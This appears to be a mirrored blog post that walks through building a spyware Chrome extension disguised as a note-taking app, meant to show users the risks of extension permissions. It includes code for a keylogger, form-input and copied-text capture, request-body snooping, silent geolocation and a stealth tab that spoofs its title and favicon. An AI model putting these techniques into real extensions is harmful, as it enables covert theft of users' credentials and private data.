<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://mattfrisbie.substack.com/p/spy-chrome-extension">Original</a>
    <h1>Let&#39;s build a Chrome extension that steals everything</h1>
    
    <div id="readability-page-1" class="page"><div><div><article><div class=""><div><div dir="auto"><p>Manifest v3 may have taken some of the juice out of browser extensions, but I think there is still plenty left in the tank. To prove it, let’s build a Chrome extension that steals as much data as possible. I’m talking kitchen sink, whole enchilada, Grinch-plundering-Whoville levels of data theft.</p><p>This will accomplish two things:</p><ul><li><p>Explore the edges of what is possible with Chrome extensions</p></li><li><p>Demonstrate what you are exposed to if you aren’t careful with what you install</p></li></ul><p><em>Disclaimer: actually implementing this would be evil. You shouldn’t abuse extension permissions, steal user data, or build malicious browser extensions. Any implementation, derivative extension, or utilization of these techniques, without the express written consent of Major League Baseball, is not advised.</em></p><ul><li><p>The user shouldn’t be aware that anything is happening behind the scenes. </p></li><li><p>There must be no visual indication that anything is awry.</p><ul><li><p>No extra console messages, warnings, or errors.</p></li><li><p>No additional browser warning or permission dialogs.</p></li><li><p>No extra page-level network traffic.</p></li></ul></li><li><p><span>Once the user agrees to the </span><em>*ahem*</em><span> ample permission warnings, that’s the last time they should have to think about the extension’s permissions.</span></p></li></ul><p>If you’re not familiar with the internals of browser extensions, there’s three components that we care about for our evil extension:</p><p><strong>Background Service Worker</strong></p><ul><li><p>Event driven. Can be used as a “persistent” container for running JavaScript</p></li><li><p>Can access all* of the WebExtensions API</p></li><li><p>Cannot access DOM APIs</p></li><li><p>Cannot directly access pages</p></li></ul><p><strong>Popup Page</strong></p><ul><li><p>Only opens after user interaction</p></li><li><p>Can access all* of the WebExtensions API</p></li><li><p>Can access DOM APIs</p></li><li><p>Cannot directly access pages</p></li></ul><p><strong>Content Script</strong></p><ul><li><p>Has direct and full access to all pages and the DOM</p></li><li><p>Can run JavaScript in page, but in sandboxed runtime</p></li><li><p>Can only use a subset of the WebExtensions API</p></li><li><p>Subject to same restrictions as page (CORS, etc)</p></li></ul><p><em>*Minor restrictions apply, batteries not included</em></p><p><span>Just for fun, our malicious extension will request </span><em>all</em><span> possible permissions. </span><a href="https://developer.chrome.com/docs/extensions/mv3/declare_permissions/" rel="nofollow ugc noopener">https://developer.chrome.com/docs/extensions/mv3/declare_permissions/</a><span> has a list of Chrome extension permissions, and we’ll take the lot. </span></p><p>After pruning out all permissions that Chrome doesn’t support, we get the following:</p><pre><code>{
  ...
  &#34;host_permissions&#34;: [&#34;&lt;all_urls&gt;&#34;],
  &#34;permissions&#34;: [
    &#34;activeTab&#34;,
    &#34;alarms&#34;,
    &#34;background&#34;,
    &#34;bookmarks&#34;,
    &#34;browsingData&#34;,
    &#34;clipboardRead&#34;,
    &#34;clipboardWrite&#34;,
    &#34;contentSettings&#34;,
    &#34;contextMenus&#34;,
    &#34;cookies&#34;,
    &#34;debugger&#34;,
    &#34;declarativeContent&#34;,
    &#34;declarativeNetRequest&#34;,
    &#34;declarativeNetRequestWithHostAccess&#34;,
    &#34;declarativeNetRequestFeedback&#34;,
    &#34;desktopCapture&#34;,
    &#34;downloads&#34;,
    &#34;fontSettings&#34;,
    &#34;gcm&#34;,
    &#34;geolocation&#34;,
    &#34;history&#34;,
    &#34;identity&#34;,
    &#34;idle&#34;,
    &#34;management&#34;,
    &#34;nativeMessaging&#34;,
    &#34;notifications&#34;,
    &#34;pageCapture&#34;,
    &#34;power&#34;,
    &#34;printerProvider&#34;,
    &#34;privacy&#34;,
    &#34;proxy&#34;,
    &#34;scripting&#34;,
    &#34;search&#34;,
    &#34;sessions&#34;,
    &#34;storage&#34;,
    &#34;system.cpu&#34;,
    &#34;system.display&#34;,
    &#34;system.memory&#34;,
    &#34;system.storage&#34;,
    &#34;tabCapture&#34;,
    &#34;tabGroups&#34;,
    &#34;tabs&#34;,
    &#34;tabs&#34;,
    &#34;topSites&#34;,
    &#34;tts&#34;,
    &#34;ttsEngine&#34;,
    &#34;unlimitedStorage&#34;,
    &#34;webNavigation&#34;,
    &#34;webRequest&#34;
  ],
}</code></pre><p><em>manifest.json</em></p><p>Most of these permissions won’t be needed, but who cares? Let’s see what the warning message looks like:</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8f0e4276-498c-4d46-80fb-466437307695_2184x1426.png" rel="nofollow ugc noopener"><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8f0e4276-498c-4d46-80fb-466437307695_2184x1426.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8f0e4276-498c-4d46-80fb-466437307695_2184x1426.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8f0e4276-498c-4d46-80fb-466437307695_2184x1426.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8f0e4276-498c-4d46-80fb-466437307695_2184x1426.png 1456w" sizes="100vw"/><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8f0e4276-498c-4d46-80fb-466437307695_2184x1426.png" width="1456" height="951" data-attrs="{&#34;src&#34;:&#34;https://substack-post-media.s3.amazonaws.com/public/images/8f0e4276-498c-4d46-80fb-466437307695_2184x1426.png&#34;,&#34;fullscreen&#34;:null,&#34;imageSize&#34;:null,&#34;height&#34;:951,&#34;width&#34;:1456,&#34;resizeWidth&#34;:null,&#34;bytes&#34;:408660,&#34;alt&#34;:null,&#34;title&#34;:null,&#34;type&#34;:&#34;image/png&#34;,&#34;href&#34;:null,&#34;belowTheFold&#34;:true,&#34;internalRedirect&#34;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8f0e4276-498c-4d46-80fb-466437307695_2184x1426.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8f0e4276-498c-4d46-80fb-466437307695_2184x1426.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8f0e4276-498c-4d46-80fb-466437307695_2184x1426.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8f0e4276-498c-4d46-80fb-466437307695_2184x1426.png 1456w" sizes="100vw" loading="lazy"/></picture></div></a></figure></div><p>Chrome scrolls the permission warning message container, so more than half of the warning messages don’t even show up. I’d bet most users wouldn’t think twice about installing an extension that appears to ask for just 5 permissions.</p><p><span>The </span><strong>full</strong><span> permission warning list is as follows:</span></p><ul><li><p>Above the fold:</p><ul><li><p>Access the page debugger backend</p></li><li><p>Read and change all your data on websites</p></li><li><p>Detect your physical location</p></li><li><p>Read and change your browsing history on all your signed-in devices</p></li><li><p>Display notifications</p></li></ul></li><li><p>Below the fold:</p><ul><li><p>Read and change your bookmarks</p></li><li><p>Read and modify data you copy and paste</p></li><li><p>Capture content of your screen</p></li><li><p>Manage your downloads</p></li><li><p>Identify and eject storage devices</p></li><li><p>Change your settings that websites’ access to features such as cookies, JavaScript, plugins, geolocation, microphone, camera, etc.</p></li><li><p>Manage your apps, extensions, and themes</p></li><li><p>Communicate with cooperating native applications</p></li><li><p>Change your privacy-related settings</p></li><li><p>View and manage your tab groups</p></li><li><p>Read all text using spoken synthesized speech</p></li></ul></li></ul><p>Let’s add in a content script that runs in all pages and frames, extend our extension’s coverage to incognito windows, and make all our resources accessible just in case we need them:</p><pre><code><code>{
  ...
  &#34;web_accessible_resources&#34;: [
    {
      &#34;resources&#34;: [&#34;*&#34;],
      &#34;matches&#34;: [&#34;&lt;all_urls&gt;&#34;]
    }
  ],
  &#34;content_scripts&#34;: [
    {
      &#34;matches&#34;: [&#34;&lt;all_urls&gt;&#34;],
      &#34;all_frames&#34;: true,
      &#34;css&#34;: [],
      &#34;js&#34;: [&#34;content-script.js&#34;],
      &#34;run_at&#34;: &#34;document_end&#34;
    }
  ],
  &#34;incognito&#34;: &#34;spanning&#34;,
}</code></code></pre><p><em>manifest.json</em></p><p>Our heinous extension will masquerade as a note-taking app:</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F79b66d53-5aec-4c0a-91d0-8ae3fcba5753_1702x922.png" rel="nofollow ugc noopener"><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F79b66d53-5aec-4c0a-91d0-8ae3fcba5753_1702x922.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F79b66d53-5aec-4c0a-91d0-8ae3fcba5753_1702x922.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F79b66d53-5aec-4c0a-91d0-8ae3fcba5753_1702x922.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F79b66d53-5aec-4c0a-91d0-8ae3fcba5753_1702x922.png 1456w" sizes="100vw"/><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F79b66d53-5aec-4c0a-91d0-8ae3fcba5753_1702x922.png" width="1456" height="789" data-attrs="{&#34;src&#34;:&#34;https://substack-post-media.s3.amazonaws.com/public/images/79b66d53-5aec-4c0a-91d0-8ae3fcba5753_1702x922.png&#34;,&#34;fullscreen&#34;:null,&#34;imageSize&#34;:null,&#34;height&#34;:789,&#34;width&#34;:1456,&#34;resizeWidth&#34;:null,&#34;bytes&#34;:82693,&#34;alt&#34;:null,&#34;title&#34;:null,&#34;type&#34;:&#34;image/png&#34;,&#34;href&#34;:null,&#34;belowTheFold&#34;:true,&#34;internalRedirect&#34;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F79b66d53-5aec-4c0a-91d0-8ae3fcba5753_1702x922.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F79b66d53-5aec-4c0a-91d0-8ae3fcba5753_1702x922.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F79b66d53-5aec-4c0a-91d0-8ae3fcba5753_1702x922.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F79b66d53-5aec-4c0a-91d0-8ae3fcba5753_1702x922.png 1456w" sizes="100vw" loading="lazy"/></picture></div></a></figure></div><p>This gives us an extension page that will be opened frequently, allowing us to perform nefarious data collection silently. We’ll also use a background service worker.</p><p>Life is short, the internet is fast, and storage is cheap. Any data our extension decides to collect can be sent off to a server we control through the background service worker, and the user will be none the wiser. These network requests will only show up if they decide to inspect the network activity of the extension itself, which is pretty hard to get to.</p><p>Want to add invasive user tracking to web pages? No problem! Network traffic from the background page is not subject to ad blockers or other user privacy extensions, so track every click and keystroke to you heart’s content. (External network traffic managers and things like PiHole will still work)</p><p>Right off the bat, the WebExtensions API lets us collect quite a bit with almost zero effort.</p><p><code>chrome.cookies.getAll({})</code><span> retrieves all the browser’s cookies as an array.</span></p><p><code>chrome.history.search({ text: &#34;&#34; })</code><span> retrieves the user’s entire browsing history as an array.</span></p><p><code>chrome.tabs.captureVisibleTab()</code><span> silently captures a screenshot of whatever the user is currently looking at. We can call this as often as we like with messages sent from the content script - or even more frequently on URLs we deem to be valuable. The API returns the image as nice data URL strings, so it’s trivial to whisk them off to our data collection endpoint.</span></p><p>Are your browser extensions capturing your screen right now? You’ll never know!</p><p><span>We can use the </span><code>webNavigation</code><span> API to easily track the user’s browsing activity in real time:</span></p><pre><code>chrome.webNavigation.onCompleted.addListener((details) =&gt; {
  // {
  //   &#34;documentId&#34;: &#34;F5009EFE5D3C074730E67F5C1D934C0A&#34;,
  //   &#34;documentLifecycle&#34;: &#34;active&#34;,
  //   &#34;frameId&#34;: 0,
  //   &#34;frameType&#34;: &#34;outermost_frame&#34;,
  //   &#34;parentFrameId&#34;: -1,
  //   &#34;processId&#34;: 139,
  //   &#34;tabId&#34;: 174034187,
  //   &#34;timeStamp&#34;: 1676958729790.8088,
  //   &#34;url&#34;: &#34;https://www.linkedin.com/feed/&#34;
  // }
});</code></pre><p><em>background.js</em></p><p><span>The </span><code>webRequest</code><span> API lets us watch all network traffic from every tab, tease out network traffic with a </span><code>requestBody</code><span>, and extract capturing credentials, addresses, etc:</span></p><pre><code>chrome.webRequest.onBeforeRequest.addListener(
  (details) =&gt; {
    if (details.requestBody) {
      // Capture requestBody data
    }
  },
  {
    urls: [&#34;&lt;all_urls&gt;&#34;],
  },
  [&#34;requestBody&#34;]
);</code></pre><p><em>background.js</em></p><p>With a content script running on every page, reading keystrokes is dead easy. Creating a keystroke buffer that is periodically flushed will give us nice consecutive keystrokes that are easy to read.</p><pre><code>let buffer = &#34;&#34;;

const debouncedCaptureKeylogBuffer = _.debounce(async () =&gt; {
  if (buffer.length &gt; 0) {
    // Flush the buffer

    buffer = &#34;&#34;;
  }
}, 1000);

document.addEventListener(&#34;keyup&#34;, (e: KeyboardEvent) =&gt; {
  buffer += e.key;

  debouncedCaptureKeylogBuffer();
});</code></pre><p><em>content-script.js</em></p><p><span>From the content script, we can just listen for </span><code>input</code><span> events on any editable elements and capture their value. </span></p><pre><code>[...document.querySelectorAll(&#34;input,textarea,[contenteditable]&#34;)].map((input) =&gt;
  input.addEventListener(&#34;input&#34;, _.debounce((e) =&gt; {
    // Read input value
  }, 1000))
);</code></pre><p><em>content-script.js</em></p><p><span>If we’re expecting the page DOM to change often (for example, with SPAs), we certainly don’t want to miss out on any valuable data.  Just set a </span><code>MutationObserver</code><span> to watch the entire page, and reapply listeners as needed.</span></p><pre><code>const inputs: WeakSet&lt;Element&gt; = new WeakSet();

const debouncedHandler = _.debounce(() =&gt; {
  [...document.querySelectorAll(&#34;input,textarea,[contenteditable&#34;)]
    .filter((input: Element) =&gt; !inputs.has(input))
    .map((input) =&gt; {
      input.addEventListener(
        &#34;input&#34;,
        _.debounce((e) =&gt; {
          // Read input value
        }, 1000)
      );

      inputs.add(input);
    });
}, 1000);

const observer = new MutationObserver(() =&gt; debouncedHandler());
observer.observe(document.body, { subtree: true, childList: true });</code></pre><p><em>content-script.js</em></p><p><span>This one is a bit trickier. </span><code>navigator.clipboard.read()</code><span> or any other Clipboard API methods will prompt the user with a permissions dialog, so these are off-limits. </span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F59d6015e-fd8d-4550-a954-2220f293d332_1286x738.png" rel="nofollow ugc noopener"><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F59d6015e-fd8d-4550-a954-2220f293d332_1286x738.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F59d6015e-fd8d-4550-a954-2220f293d332_1286x738.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F59d6015e-fd8d-4550-a954-2220f293d332_1286x738.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F59d6015e-fd8d-4550-a954-2220f293d332_1286x738.png 1456w" sizes="100vw"/><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F59d6015e-fd8d-4550-a954-2220f293d332_1286x738.png" width="1286" height="738" data-attrs="{&#34;src&#34;:&#34;https://substack-post-media.s3.amazonaws.com/public/images/59d6015e-fd8d-4550-a954-2220f293d332_1286x738.png&#34;,&#34;fullscreen&#34;:null,&#34;imageSize&#34;:null,&#34;height&#34;:738,&#34;width&#34;:1286,&#34;resizeWidth&#34;:null,&#34;bytes&#34;:224050,&#34;alt&#34;:null,&#34;title&#34;:null,&#34;type&#34;:&#34;image/png&#34;,&#34;href&#34;:null,&#34;belowTheFold&#34;:true,&#34;internalRedirect&#34;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F59d6015e-fd8d-4550-a954-2220f293d332_1286x738.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F59d6015e-fd8d-4550-a954-2220f293d332_1286x738.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F59d6015e-fd8d-4550-a954-2220f293d332_1286x738.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F59d6015e-fd8d-4550-a954-2220f293d332_1286x738.png 1456w" sizes="100vw" loading="lazy"/></picture></div></a></figure></div><p><span>Using </span><code>document.execCommand(&#34;paste&#34;)</code><span> to dump the clipboard into a hidden input is unreliable, so we’re stuck grabbing the selected text out of the page.</span></p><pre><code>document.addEventListener(&#34;copy&#34;, () =&gt; {
  const selected = window.getSelection()?.toString();

  // Capture selected text on copy events
});</code></pre><p><em>content-script.js</em></p><p>(Note: I’m not totally satisfied with this, but good enough for now.)</p><p><span>Geolocation capturing is the trickiest one due to Chrome’s restrictions on when and how it an be captured. Adding the </span><code>geolocation</code><span> permission only allows us to capture the location inside </span><em>an extension page</em><span>, not from content scripts. If the popup is opened frequently enough, this might be sufficient.</span></p><pre><code>navigator.geolocation.getCurrentPosition(
  (position) =&gt; {
    // Capture position
  },
  (e) =&gt; {},
  {
    enableHighAccuracy: true,
    timeout: 5000,
    maximumAge: 0,
  }
);</code></pre><p><span> </span><em>popup.js</em></p><p><span>If we need </span><em>more</em><span> geolocation data, we’ll need to do it from a content script. We need to prevent the browser from generating a permission dialog, so first we check if the page already has the geolocation permission. If it does, we can silently request the location.</span></p><pre><code>navigator.permissions
  .query({ name: &#34;geolocation&#34; })
  .then(({ state }: { state: string }) =&gt; {
    if (state === &#34;granted&#34;) {
      captureGeolocation();
    }
  });</code></pre><p><em>content-script.js</em></p><p>If you’re anything like me, you have a ton of tabs open. Most tabs sit there idly for long stretches of time, and Chrome eagerly unmounts idle tabs to free up system resources.</p><p><span>Suppose we needed to open an extension page in a tab without the user noticing. Maybe we need to perform some additional page-level processing with the WebExtensions API. Opening and closing a new tab would cause a lot of visual movement in the tab bar, this is too suspicious. Instead, let’s reuse an existing tab and make it </span><em>appear</em><span> to be the old tab. </span></p><p>This could work as follows:</p><ol><li><p>Find a candidate tab that the user isn’t paying attention to.</p></li><li><p>Record its URL, favicon URL, and title.</p></li><li><p>Replace that tab with our extension page, and immediately replace the favicon and title so it resembles the original tab.</p></li><li><p>Do bad things.</p></li><li><p>Once the page finishes, or once the user opens the tab, navigate back to the original URL.</p></li></ol><p>Let’s build a proof of concept. Here’s an example background script to open the stealth tab:</p><pre><code>export async function openStealthTab() {
  const tabs = await chrome.tabs.query({
    // Don&#39;t use the tab the user is looking at
    active: false,
    // Don&#39;t use pinned tabs, they&#39;re probably used frequently
    pinned: false,
    // Don&#39;t use a tab generating audio
    audible: false,
    // Don&#39;t use a tab until it is finished loading
    status: &#34;complete&#34;,
  });

  const [eligibleTab] = tabs.filter((tab) =&gt; {
    // Must have url and id
    if (!tab.id || !tab.url) {
      return false;
    }

    // Don&#39;t use extension pages
    if (new URL(tab.url).protocol === &#34;chrome-extension:&#34;) {
      return false;
    }

    return true;
  });

  if (eligibleTab) {
    // These values will be used to spoof the current page
    // and navigate back
    const searchParams = new URLSearchParams({
      returnUrl: eligibleTab.url as string,
      faviconUrl: eligibleTab.favIconUrl || &#34;&#34;,
      title: eligibleTab.title || &#34;&#34;,
    });

    const url = `${chrome.runtime.getURL(
      &#34;stealth-tab.html&#34;
    )}?${searchParams.toString()}`;

    // Open the stealth tab
    await chrome.tabs.update(eligibleTab.id, {
      url,
      active: false,
    });
  }
}</code></pre><p><em>background.js</em></p><p>And here’s our stealth tab script:</p><pre><code>
const searchParams = new URL(window.location.href).searchParams;

// Spoof the previous page tab appearance
document.title = searchParams.get(&#39;title);
document.querySelector(`link[rel=&#34;icon&#34;]`)
  .setAttribute(&#34;href&#34;, searchParams.get(&#39;faviconUrl&#39;));

function useReturnUrl() {
  // User focused this tab, flee!
  window.location.href = searchParams.get(&#39;returnUrl&#39;);
}

// Check to see if this page is visible on load
if (document.visibilityState === &#34;visible&#34;) {
  useReturnUrl();
}

document.addEventListener(&#34;visibilitychange&#34;, () =&gt; useReturnUrl());

// Now do bad things

// Done doing bad things, return!
useReturnUrl();</code></pre><p><em>stealth-tab.js</em></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2357fbff-093e-441f-bf95-9a27cb461ce2_782x324.png" rel="nofollow ugc noopener"><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2357fbff-093e-441f-bf95-9a27cb461ce2_782x324.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2357fbff-093e-441f-bf95-9a27cb461ce2_782x324.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2357fbff-093e-441f-bf95-9a27cb461ce2_782x324.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2357fbff-093e-441f-bf95-9a27cb461ce2_782x324.png 1456w" sizes="100vw"/><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2357fbff-093e-441f-bf95-9a27cb461ce2_782x324.png" width="782" height="324" data-attrs="{&#34;src&#34;:&#34;https://substack-post-media.s3.amazonaws.com/public/images/2357fbff-093e-441f-bf95-9a27cb461ce2_782x324.png&#34;,&#34;fullscreen&#34;:null,&#34;imageSize&#34;:null,&#34;height&#34;:324,&#34;width&#34;:782,&#34;resizeWidth&#34;:null,&#34;bytes&#34;:74857,&#34;alt&#34;:null,&#34;title&#34;:null,&#34;type&#34;:&#34;image/png&#34;,&#34;href&#34;:null,&#34;belowTheFold&#34;:true,&#34;internalRedirect&#34;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2357fbff-093e-441f-bf95-9a27cb461ce2_782x324.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2357fbff-093e-441f-bf95-9a27cb461ce2_782x324.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2357fbff-093e-441f-bf95-9a27cb461ce2_782x324.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2357fbff-093e-441f-bf95-9a27cb461ce2_782x324.png 1456w" sizes="100vw" loading="lazy"/></picture></div></a></figure></div><p>Nothing suspicious here!</p><p>I’m kidding, of course. This extension would be laughed out of the review queue.</p><p><span>This extension is obviously a caricature of a malicious extension, but is it so crazy to think that a subset of this behavior could be used? When installing a Chrome extension that </span><em>seems</em><span> trustworthy (whatever that means), most users will ignore the permissions warning messages no matter how scary they are. Once you accept the permissions, you are at the extension’s mercy.</span></p><p>You might be thinking “Matt, surely this doesn’t apply to me! I’m a savvy tech guru who is careful, fastidious, and obsequious. Nobody could ever pull one over on me.”</p><p>In that case, my obsequious friend, answer these questions: </p><ul><li><p>Without looking, can you name more than half of the extensions you have installed right now?</p></li><li><p>Who maintains them? Is it the same entity that maintained it when you first installed? Are you sure?</p></li><li><p><span>Did you </span><em>really</em><span> scrutinize their permissions?</span></p></li></ul><p><span>You can test out the Spy Extension here: </span><a href="https://github.com/msfrisbie/spy-extension" rel="nofollow ugc noopener">https://github.com/msfrisbie/spy-extension</a></p><p><span>I’ve added an options page so you can see all the plundered data the extension is able to suck out of your browser. I’m not going to post a screenshot; suffice to say, the contents of the page are a </span><em>tiny</em><span> bit compromising.</span></p><p>Nothing collected leaves your browser. Or does it? (No, it doesn’t)</p><p><em><span>Matt Frisbie is the author of </span><a href="https://www.buildingbrowserextensions.com/" rel="nofollow ugc noopener">Building Browser Extensions</a></em><span> </span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fadf0c4e9-b988-4680-a37b-fd458bddbd01_2866x1396.png" rel="nofollow ugc noopener"><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fadf0c4e9-b988-4680-a37b-fd458bddbd01_2866x1396.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fadf0c4e9-b988-4680-a37b-fd458bddbd01_2866x1396.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fadf0c4e9-b988-4680-a37b-fd458bddbd01_2866x1396.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fadf0c4e9-b988-4680-a37b-fd458bddbd01_2866x1396.png 1456w" sizes="100vw"/><img 